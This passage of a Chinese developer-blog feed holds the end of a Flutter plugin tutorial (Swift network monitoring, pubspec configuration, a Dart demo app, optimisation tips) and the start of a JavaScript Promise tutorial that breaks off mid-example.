                type <span class="hljs-operator">=</span> <span class="hljs-string">"mobile"</span>
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> path.usesInterfaceType(.wiredEthernet) {
                type <span class="hljs-operator">=</span> <span class="hljs-string">"ethernet"</span>
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> path.usesInterfaceType(.loopback) {
                type <span class="hljs-operator">=</span> <span class="hljs-string">"loopback"</span>
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> path.usesInterfaceType(.other) {
                type <span class="hljs-operator">=</span> <span class="hljs-string">"other"</span>
            }
            
            <span class="hljs-keyword">let</span> status: [<span class="hljs-type">String</span>: <span class="hljs-keyword">Any</span>] <span class="hljs-operator">=</span> [
                <span class="hljs-string">"isConnected"</span>: isConnected,
                <span class="hljs-string">"type"</span>: type,
                <span class="hljs-string">"isRoaming"</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-string">"extraInfo"</span>: <span class="hljs-literal">nil</span>
            ]
            
            <span class="hljs-comment">// 发送到Dart</span>
            <span class="hljs-type">DispatchQueue</span>.main.async {
                <span class="hljs-keyword">self</span>.eventSink<span class="hljs-operator">?</span>(status)
            }
        }
        
        monitor<span class="hljs-operator">?</span>.start(queue: queue)
    }
    
    <span class="hljs-comment">// 释放网络监控</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">disposeNetworkMonitoring</span>() {
        monitor<span class="hljs-operator">?</span>.cancel()
        monitor <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>
    }
}

<span class="hljs-keyword">extension</span> <span class="hljs-title class_">FlutterNetworkPlugin</span>: <span class="hljs-title class_">FlutterStreamHandler</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">onListen</span>(<span class="hljs-params">withArguments</span> <span class="hljs-params">arguments</span>: <span class="hljs-keyword">Any</span><span class="hljs-operator">?</span>, 
                        <span class="hljs-params">eventSink</span> <span class="hljs-params">events</span>: <span class="hljs-keyword">@escaping</span> <span class="hljs-type">FlutterEventSink</span>) -&gt; <span class="hljs-type">FlutterError</span>? {
        eventSink <span class="hljs-operator">=</span> events
        
        <span class="hljs-comment">// 立即发送当前状态</span>
        <span class="hljs-keyword">let</span> status <span class="hljs-operator">=</span> getCurrentNetworkStatus()
        events(status)
        
        <span class="hljs-comment">// 初始化监控</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">#available</span>(<span class="hljs-keyword">iOS</span> <span class="hljs-number">12.0</span>, <span class="hljs-operator">*</span>) {
            initializeNetworkMonitoring()
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">onCancel</span>(<span class="hljs-params">withArguments</span> <span class="hljs-params">arguments</span>: <span class="hljs-keyword">Any</span><span class="hljs-operator">?</span>) -&gt; <span class="hljs-type">FlutterError</span>? {
        eventSink <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>
        disposeNetworkMonitoring()
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
    }
}
</code></pre>
<h5 data-id="heading-32">第五步：配置插件</h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># pubspec.yaml</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">flutter_network_plugin</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">A</span> <span class="hljs-string">Flutter</span> <span class="hljs-string">plugin</span> <span class="hljs-string">for</span> <span class="hljs-string">monitoring</span> <span class="hljs-string">network</span> <span class="hljs-string">status.</span>
<span class="hljs-attr">version:</span> <span class="hljs-number">1.0</span><span class="hljs-number">.0</span>
<span class="hljs-attr">homepage:</span> <span class="hljs-string">https://github.com/xxxx/flutter_network_plugin</span>

<span class="hljs-attr">environment:</span>
  <span class="hljs-attr">sdk:</span> <span class="hljs-string">"&gt;=2.17.0 &lt;3.0.0"</span>
  <span class="hljs-attr">flutter:</span> <span class="hljs-string">"&gt;=1.17.0"</span>

<span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">flutter:</span>
    <span class="hljs-attr">sdk:</span> <span class="hljs-string">flutter</span>

<span class="hljs-attr">dev_dependencies:</span>
  <span class="hljs-attr">flutter_test:</span>
    <span class="hljs-attr">sdk:</span> <span class="hljs-string">flutter</span>

<span class="hljs-attr">flutter:</span>
  <span class="hljs-attr">plugin:</span>
    <span class="hljs-attr">platforms:</span>
      <span class="hljs-attr">android:</span>
        <span class="hljs-attr">package:</span> <span class="hljs-string">com.example.flutter_network_plugin</span>
        <span class="hljs-attr">pluginClass:</span> <span class="hljs-string">FlutterNetworkPlugin</span>
      <span class="hljs-attr">ios:</span>
        <span class="hljs-attr">pluginClass:</span> <span class="hljs-string">FlutterNetworkPlugin</span>
</code></pre>
<h5 data-id="heading-33">第六步：编写使用案例</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// xxxx/lib/main.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_network_plugin/flutter_network_plugin.dart'</span>;

<span class="hljs-keyword">void</span> main() {
  runApp(MyApp());
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _MyAppState createState() =&gt; _MyAppState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_MyAppState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">MyApp</span>&gt; </span>{
  NetworkStatus _currentStatus = NetworkStatus(
    isConnected: <span class="hljs-keyword">false</span>,
    type: NetworkType.unknown,
  );
  StreamSubscription&lt;NetworkStatus&gt;? _subscription;

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    _initNetworkPlugin();
  }

  Future&lt;<span class="hljs-keyword">void</span>&gt; _initNetworkPlugin() <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// 初始化插件</span>
    <span class="hljs-keyword">await</span> FlutterNetworkPlugin.initialize();
    
    <span class="hljs-comment">// 获取当前状态</span>
    <span class="hljs-keyword">final</span> status = <span class="hljs-keyword">await</span> FlutterNetworkPlugin.currentStatus;
    setState(() {
      _currentStatus = status;
    });
    
    <span class="hljs-comment">// 监听状态变化</span>
    _subscription = FlutterNetworkPlugin.onStatusChanged.listen((status) {
      setState(() {
        _currentStatus = status;
      });
    });
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    _subscription?.cancel();
    FlutterNetworkPlugin.dispose();
    <span class="hljs-keyword">super</span>.dispose();
  }

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> MaterialApp(
      home: Scaffold(
        appBar: AppBar(
          title: Text(<span class="hljs-string">'网络状态插件'</span>),
        ),
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              <span class="hljs-comment">// 连接状态指示器</span>
              Container(
                width: <span class="hljs-number">100</span>,
                height: <span class="hljs-number">100</span>,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: _currentStatus.isConnected ? Colors.green : Colors.red,
                ),
                child: Icon(
                  _currentStatus.isConnected ? Icons.wifi : Icons.wifi_off,
                  size: <span class="hljs-number">50</span>,
                  color: Colors.white,
                ),
              ),
              SizedBox(height: <span class="hljs-number">20</span>),
              <span class="hljs-comment">// 状态信息</span>
              Text(
                _currentStatus.isConnected ? <span class="hljs-string">'已连接'</span> : <span class="hljs-string">'未连接'</span>,
                style: TextStyle(
                  fontSize: <span class="hljs-number">24</span>,
                  fontWeight: FontWeight.bold,
                ),
              ),
              SizedBox(height: <span class="hljs-number">10</span>),
              Text(
                <span class="hljs-string">'网络类型: <span class="hljs-subst">${_currentStatus.type.toString().split(<span class="hljs-string">'.'</span>).last}</span>'</span>,
                style: TextStyle(fontSize: <span class="hljs-number">18</span>),
              ),
              <span class="hljs-keyword">if</span> (_currentStatus.subtype != <span class="hljs-keyword">null</span>)
                Text(
                  <span class="hljs-string">'子类型: <span class="hljs-subst">${_currentStatus.subtype}</span>'</span>,
                  style: TextStyle(fontSize: <span class="hljs-number">16</span>),
                ),
              SizedBox(height: <span class="hljs-number">30</span>),
              <span class="hljs-comment">// 刷新按钮</span>
              ElevatedButton(
                onPressed: () <span class="hljs-keyword">async</span> {
                  <span class="hljs-keyword">final</span> status = <span class="hljs-keyword">await</span> FlutterNetworkPlugin.currentStatus;
                  setState(() {
                    _currentStatus = status;
                  });
                },
                child: Text(<span class="hljs-string">'刷新状态'</span>),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
</code></pre>
<h3 data-id="heading-34">六、优化</h3>
<h4 data-id="heading-35">6.1 性能优化技巧</h4>
<h5 data-id="heading-36">1. 减少跨平台调用次数</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 不推荐：多次调用</span>
Future&lt;<span class="hljs-keyword">void</span>&gt; saveUser(User user) <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'saveName'</span>, user.name);
  <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'saveAge'</span>, user.age);
  <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'saveEmail'</span>, user.email);
}

<span class="hljs-comment">// 推荐</span>
Future&lt;<span class="hljs-keyword">void</span>&gt; saveUser(User user) <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'saveUser'</span>, {
    <span class="hljs-string">'name'</span>: user.name,
    <span class="hljs-string">'age'</span>: user.age,
    <span class="hljs-string">'email'</span>: user.email,
  });
}
</code></pre>
<h5 data-id="heading-37">2. 使用Isolate处理耗时任务</h5>
<pre><code class="hljs language-dart" lang="dart">Future&lt;<span class="hljs-keyword">void</span>&gt; processLargeData(<span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">dynamic</span>&gt; data) <span class="hljs-keyword">async</span> {
  <span class="hljs-comment">// 在Isolate中处理，避免阻塞UI</span>
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> compute(_processInIsolate, data);
  <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'saveResult'</span>, result);
}

<span class="hljs-keyword">static</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">dynamic</span>&gt; _processInIsolate(<span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">dynamic</span>&gt; data) {
  <span class="hljs-comment">// 耗时处理逻辑</span>
  <span class="hljs-keyword">return</span> processedData;
}
</code></pre>
<h5 data-id="heading-38">3. 内存管理</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Android侧：及时释放资源</span>
<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onDetachedFromEngine</span><span class="hljs-params">(binding: <span class="hljs-type">FlutterPlugin</span>.<span class="hljs-type">FlutterPluginBinding</span>)</span></span> {
    methodChannel.setMethodCallHandler(<span class="hljs-literal">null</span>)
    eventSink?.endOfStream()
    eventSink = <span class="hljs-literal">null</span>
}
</code></pre>
<h4 data-id="heading-39">6.2 错误处理</h4>
<h5 data-id="heading-40">1. 统一的错误处理</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PluginError</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Exception</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> code;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> message;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">dynamic</span> details;
  
  PluginError({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.code,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.message,
    <span class="hljs-keyword">this</span>.details,
  });
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">String</span> toString() =&gt; <span class="hljs-string">'PluginError(<span class="hljs-subst">$code</span>): <span class="hljs-subst">$message</span>'</span>;
}

Future&lt;T&gt; safeInvoke&lt;T&gt;(<span class="hljs-built_in">String</span> method, [<span class="hljs-built_in">dynamic</span> arguments]) <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> _channel.invokeMethod(method, arguments);
    <span class="hljs-keyword">return</span> result <span class="hljs-keyword">as</span> T;
  } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-keyword">throw</span> PluginError(
      code: e.code,
      message: e.message ?? <span class="hljs-string">'Unknown error'</span>,
      details: e.details,
    );
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-keyword">throw</span> PluginError(
      code: <span class="hljs-string">'UNKNOWN'</span>,
      message: e.toString(),
      details: e,
    );
  }
}
</code></pre>
<pre><code class="hljs language-csharp" lang="csharp">
<span class="hljs-meta">### 6.3 平台差异处理策略</span>

<span class="hljs-meta">#### 1. 功能检测与降级</span>
```dart
<span class="hljs-keyword">class</span> <span class="hljs-title">PlatformFeatureDetector</span> {
  <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">Future</span>&lt;<span class="hljs-title">bool</span>&gt; <span class="hljs-title">isFeatureAvailable</span>(<span class="hljs-params">String feature</span>) <span class="hljs-keyword">async</span></span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'checkFeature'</span>, feature);
    } <span class="hljs-keyword">on</span> PlatformException {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
  }
  
  <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">Future</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-title">withFallback</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params">{
    required Future&lt;T&gt; Function(</span>) primary,
    required Future&lt;T&gt; <span class="hljs-title">Function</span>() fallback,
    String? feature,
  }) <span class="hljs-keyword">async</span></span> {
    <span class="hljs-keyword">if</span> (feature != <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-keyword">await</span> isFeatureAvailable(feature)) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> fallback();
    }
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> primary();
    } <span class="hljs-keyword">catch</span> (e) {
      PluginLogger.error(<span class="hljs-string">'Primary method failed'</span>, e);
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> fallback();
    }
  }
}
</code></pre>
<h5 data-id="heading-41">2. 条件编译</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 使用条件导入处理平台差异</span>
<span class="hljs-keyword">export</span> <span class="hljs-string">'src/network_plugin_interface.dart'</span>;

<span class="hljs-comment">// 在platform目录下</span>
<span class="hljs-comment">// network_plugin_android.dart</span>
<span class="hljs-comment">// network_plugin_ios.dart</span>
<span class="hljs-comment">// network_plugin_web.dart</span>
</code></pre>
<h3 data-id="heading-42">总结</h3>
<p>至此，Flutter的插件开发以及如何与Android/iOS进行原生交互就全部介绍完了，我们掌握了如下知识点：</p>
<ul>
<li><strong>Platform Channel原理-Flutter与原生平台通信的底层机制</strong></li>
<li><strong>MethodChannel使用-双向方法调用的实现</strong></li>
<li><strong>EventChannel-原生到Dart的数据流传输</strong></li>
<li><strong>自定义插件开发完整流程</strong></li>
<li><strong>处理Android/iOS的差异</strong></li>
<li><strong>提升插件性能的技巧</strong></li>
</ul>
<p>插件开发是Flutter开发的重要技能，能够帮助我们深入理解Flutter架构，充分利用各平台的能力。遇到问题时，多查阅官方文档，多调试。</p>
<hr/>
<p><strong>如果这篇文章对你有帮助，别忘了一键三连~~~，有任何问题或建议，欢迎在评论区留言讨论。下期见！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解JavaScript Promise：异步编程的基石]]></title>    <link>https://juejin.cn/post/7579886397074669568</link>    <guid>https://juejin.cn/post/7579886397074669568</guid>    <pubDate>2025-12-05T03:15:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579886397074669568" data-draft-id="7579887768227414050" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解JavaScript Promise：异步编程的基石"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-05T03:15:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="少寒"/> <meta itemprop="url" content="https://juejin.cn/user/976811508112392"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解JavaScript Promise：异步编程的基石
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976811508112392/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    少寒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:15:02.000Z" title="Fri Dec 05 2025 03:15:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在JavaScript的异步编程世界里，Promise无疑是里程碑式的存在。它彻底解决了传统回调函数嵌套带来的“回调地狱”问题，让异步代码的逻辑更清晰、更具可读性和可维护性。本文将从Promise的核心概念出发，逐步剖析其工作原理、常用方法及实际应用场景，帮助你真正掌握这一异步编程利器。</p>
<h2 data-id="heading-0">一、为什么需要Promise？—— 从回调地狱说起</h2>
<p>在Promise出现之前，JavaScript处理异步操作（如网络请求、文件读取、定时器等）主要依赖回调函数。当多个异步操作存在依赖关系时，就需要将一个回调函数嵌套在另一个回调函数内部，形成层层嵌套的结构，这就是常说的“回调地狱”（Callback Hell）。</p>
<p>示例：回调地狱的困境</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟获取用户信息</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserInfo</span>(<span class="hljs-params">userId, callback</span>) {
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, { <span class="hljs-attr">userId</span>: userId, <span class="hljs-attr">userName</span>: <span class="hljs-string">"张三"</span> });
  }, <span class="hljs-number">1000</span>);
}

<span class="hljs-comment">// 模拟根据用户信息获取订单</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getOrders</span>(<span class="hljs-params">userInfo, callback</span>) {
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, [{ <span class="hljs-attr">orderId</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">goods</span>: <span class="hljs-string">"手机"</span> }, { <span class="hljs-attr">orderId</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">goods</span>: <span class="hljs-string">"电脑"</span> }]);
  }, <span class="hljs-number">1000</span>);
}

<span class="hljs-comment">// 模拟根据订单获取物流信息</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getLogistics</span>(<span class="hljs-params">order, callback</span>) {
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, { <span class="hljs-attr">logisticsId</span>: <span class="hljs-number">1001</span>, <span class="hljs-attr">status</span>: <span class="hljs-string">"已发货"</span> });
  }, <span class="hljs-number">1000</span>);
}

<span class="hljs-comment">// 层层嵌套的回调地狱</span>
<span class="hljs-title function_">getUserInfo</span>(<span class="hljs-number">1</span>, <span class="hljs-function">(<span class="hljs-params">err, userInfo</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;
  <span class="hljs-title function_">getOrders</span>(userInfo, <span class="hljs-function">(<span class="hljs-params">err, orders</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;
    <span class="hljs-title function_">getLogistics</span>(orders[<span class="hljs-number">0</span>], <span class="hljs-function">(<span class="hljs-params">err, logistics</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"物流信息："</span>, logistics);
    });
  });
});
</code></pre>
<p>上述代码中，为了获取第一个订单的物流信息，需要先获取用户信息，再获取订单列表，最后获取物流信息，形成了三层嵌套。这种代码不仅可读性差，而且一旦需要修改逻辑或排查错误，都极为困难。Promise的出现，正是为了打破这种嵌套困境，让异步代码能够像同步代码一样线性书写。</p>
<h2 data-id="heading-1">二、Promise的核心概念：状态与结果</h2>
<p>Promise是一个构造函数，用于创建表示异步操作最终完成（或失败）及其结果值的对象。其核心特征是<strong>状态不可逆</strong>，这是理解Promise的关键。</p>
<h3 data-id="heading-2">2.1 三种状态</h3>
<p>一个Promise对象从创建到结束，会经历以下三种状态之一，且状态一旦改变，就会永久保持该状态，不会再发生变化：</p>
<ul>
<li><strong>pending（等待中）</strong> ：初始状态，既不是成功也不是失败。此时异步操作正在进行中。</li>
<li><strong>fulfilled（已成功）</strong> ：异步操作顺利完成，Promise对象会接收一个“成功结果”。</li>
<li><strong>rejected（已失败）</strong> ：异步操作失败，Promise对象会接收一个“失败原因”（通常是错误对象）。</li>
</ul>
<p>状态的转换只有两种可能：从pending转为fulfilled，或从pending转为rejected。不存在fulfilled与rejected之间的相互转换，也不存在从终态转回pending的情况。</p>
<h3 data-id="heading-3">2.2 结果值</h3>
<p>与状态对应的是Promise的结果值，分为两种：</p>
<ul>
<li><strong>成功结果（value）</strong> ：当状态从pending转为fulfilled时，会携带该值，可通过<code>then</code>方法获取。</li>
<li><strong>失败原因（reason）</strong> ：当状态从pending转为rejected时，会携带该原因，可通过<code>catch</code>方法获取。</li>
</ul>
<h2 data-id="heading-4">三、Promise的基本使用：创建与调用</h2>
<p>要使用Promise，首先需要通过<code>new Promise()</code>创建Promise实例，再通过<code>then</code>和<code>catch</code>方法处理异步结果。</p>
<h3 data-id="heading-5">3.1 创建Promise实例</h3>
<p>Promise构造函数接收一个<strong>执行器函数（executor）</strong> 作为参数，该函数会在创建Promise实例时立即执行。执行器函数又接收两个参数：<code>resolve</code>和<code>reject</code>，它们都是由JavaScript引擎提供的函数，用于改变Promise的状态。</p>
<ul>
<li><code>resolve(value)</code>：将Promise状态从pending转为fulfilled，并将成功结果value传递出去。</li>
<li><code>reject(reason)</code>：将Promise状态从pending转为rejected，并将失败原因reason传递出去。</li>
</ul>
<p>示例：创建Promise实例模拟异步操作</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟获取用户信息的Promise版本</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserInfo</span>(<span class="hljs-params">userId</span>) {
  <span class="hljs-comment">// 返回一个Promise实例</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
